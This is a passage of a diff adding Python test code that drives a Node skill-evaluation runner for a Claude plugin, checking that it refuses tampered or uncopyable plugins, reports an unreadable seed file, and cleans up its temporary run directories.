+    r = json.loads(subprocess.run(['node', runner, osk, '--yes', '--read', od['codeDigest'], '--runs', '1', '--timeout', '30'], capture_output=True, text=True, cwd=repo,
+                                  env=dict(env, NODE_OPTIONS='--require ' + pre, TAMPER=tamper)).stdout)
+    assert r['status'] == want, 'a copy changed after the check was not refused as %s: %s' % (want, r)
+broken = os.path.join(t, 'broken.cjs')
+open(broken, 'w').write('''const fs = require('node:fs'), path = require('node:path'), cp = fs.cpSync;
+fs.cpSync = (from, to, o) => { if (to.includes(path.sep + 'plugins' + path.sep)) throw Object.assign(new Error('denied'), { code: 'EACCES' }); cp(from, to, o); };
+require('node:module').syncBuiltinESMExports();
+''')
+r = json.loads(subprocess.run(['node', runner, osk, '--yes', '--read', od['codeDigest'], '--runs', '1', '--timeout', '30'], capture_output=True, text=True, cwd=repo,
+                              env=dict(env, NODE_OPTIONS='--require ' + broken)).stdout)
+assert r['status'] == 'gate-failed', 'a plugin that could not be copied was not refused: %s' % r
+if os.geteuid() != 0:
+    os.chmod(os.path.join(repo, 'real.txt'), 0)
+    r = subprocess.run(['node', runner, osk, '--yes', '--read', od['codeDigest'], '--runs', '1', '--timeout', '30'], capture_output=True, text=True, env=env, cwd=repo)
+    os.chmod(os.path.join(repo, 'real.txt'), 0o644)
+    assert json.loads(r.stdout)['status'] == 'no-seed', 'a seed file that cannot be read did not end in one summary: %s' % r.stdout
+assert sorted(n for n in os.listdir(tempfile.gettempdir()) if n.startswith('skill-eval-run-')) == before, 'a refused copy left its run directory behind'
+np_ = os.path.join(t, 'out', 'np'); nsk = os.path.join(np_, 'skills', 'sk')
+os.makedirs(os.path.join(nsk, 'evals')); os.makedirs(os.path.join(np_, '.claude-plugin'))
+open(os.path.join(np_, '.claude-plugin', 'plugin.json'), 'w').write('{\"name\": \"np\"}')
+open(os.path.join(nsk, 'SKILL.md'), 'w').write('---\nname: sk\ndescription: probe\n---\nbody\n')
+json.dump([{'query': 'please review this', 'should_trigger': True}], open(os.path.join(nsk, 'evals', 'trigger_evals.json'), 'w'))
+nm = json.loads(subprocess.run(['node', runner, nsk, '--yes', '--runs', '1', '--timeout', '30'], capture_output=True, text=True, env=env, cwd=repo).stdout)
+assert nm['status'] == 'measured' and json.load(open(probe))['dirs'] == [np_], 'a plugin with no process outside the repository was copied: %s' % nm
 shutil.rmtree(t)
 print('OK trigger runner counts')"
 ```
